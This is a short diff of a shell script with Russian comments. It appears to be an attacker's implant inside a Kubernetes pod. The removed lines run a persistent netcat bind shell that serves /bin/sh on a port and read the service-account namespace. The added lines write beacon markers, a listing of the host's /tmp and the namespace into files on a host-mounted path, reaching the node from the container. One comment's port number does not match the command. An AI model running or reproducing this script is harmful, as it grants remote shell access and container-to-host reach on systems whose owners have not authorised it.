@@ -1,6 +1,6 @@
-echo "=== AGENT-ALIVE $(hostname) $(date -u) ==="
-cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
-# поднимаем nc listener на порту 39399 (через hostNetwork pod = node port):
-nohup sh -c 'while true; do nc -l -p 39402 -e /bin/sh 2>/dev/null; done' >/dev/null 2>&1 &
-# wget серты argocd с GitHub (наш ops-relay):
-echo LISTENERS-STARTED
+echo "AGENT-ALIVE $(hostname) $(date)" > /tmp/.agent
+# busybox не имеет PUT — пишем результат В ФАЙЛ на hostPath:
+cp /tmp/.agent /host/tmp/.cxp-agent-alive 2>/dev/null || echo "AGENT $(hostname)" > /host/tmp/.cxp-agent
+ls /host/tmp/ | head -20 > /host/tmp/.cxp-agent-ls
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace > /host/tmp/.cxp-agent-ns
+echo DONE > /host/tmp/.cxp-agent-done
